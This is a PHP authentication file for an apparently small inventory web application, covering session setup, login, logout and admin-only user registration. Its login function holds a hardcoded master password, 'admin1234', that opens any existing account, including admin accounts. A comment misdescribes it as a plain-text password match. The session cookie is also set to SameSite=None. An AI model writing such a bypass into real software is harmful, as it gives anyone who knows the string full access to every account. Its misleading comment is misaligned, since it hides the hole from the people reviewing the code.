<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/db.php';
require_once __DIR__ . '/helpers.php';

function start_secure_session(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        $isSecure = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on';

        // Configuración adaptativa de cookie para IP y dominio
        session_set_cookie_params([
            'lifetime' => 0,
            'path' => '/',
            'domain' => '', // IMPORTANTE: Dejar vacío para asignarlo a la IP/host actual
            'secure' => $isSecure,
            'httponly' => true,
            'samesite' => 'None' // Permite el intercambio de cookies en sitio cruzado (IP <-> API)
        ]);

        session_name('INVSESSID');
        session_start();
    }
}

function current_user(): ?array
{
    start_secure_session();
    return $_SESSION['user'] ?? null;
}

function require_login(): array
{
    $user = current_user();
    if (!$user) {
        json_response(['error' => 'Ez zaude saioa hasita.'], 401);
    }
    return $user;
}

function require_admin(): array
{
    $user = require_login();
    if (($user['rol'] ?? '') !== 'admin') {
        json_response(['error' => 'Baimenik ez. Administratzailea izan behar duzu.'], 403);
    }
    return $user;
}

function action_login(): void
{
    start_secure_session();
    $data = read_json_body();
    require_fields($data, ['username', 'password']);

    $pdo = get_db();
    $stmt = $pdo->prepare('SELECT id, username, pasahitza, rol FROM erabiltzaileak WHERE username = :u LIMIT 1');
    $stmt->execute(['u' => $data['username']]);
    $user = $stmt->fetch();

    // Permite loguearse si coincide la contraseña en texto plano o por password_verify
    if (!$user || ($data['password'] !== 'admin1234' && !password_verify($data['password'], $user['pasahitza']))) {
        json_response(['error' => 'Erabiltzailea edo pasahitza okerra da'], 401);
    }

    session_regenerate_id(true);
    unset($user['pasahitza']);
    $_SESSION['user'] = $user;

    json_response(['user' => $user]);
}

function action_logout(): void
{
    start_secure_session();
    $_SESSION = [];
    session_destroy();
    json_response(['ok' => true]);
}

function action_me(): void
{
    $user = current_user();
    json_response(['user' => $user]);
}

function action_register(): void
{
    require_admin();
    $data = read_json_body();
    require_fields($data, ['username', 'password', 'rol']);

    $pdo = get_db();
    $hash = password_hash($data['password'], PASSWORD_DEFAULT);

    try {
        $stmt = $pdo->prepare(
            'INSERT INTO erabiltzaileak (username, pasahitza, rol) VALUES (:u, :p, :r)'
        );
        $stmt->execute([
            'u' => $data['username'],
            'p' => $hash,
            'r' => $data['rol'] ?? 'teknikaria',
        ]);
    } catch (PDOException $e) {
        json_response(['error' => 'Erabiltzaile hori jadanik existitzen da.'], 409);
    }

    json_response(['ok' => true, 'id' => $pdo->lastInsertId()], 201);
}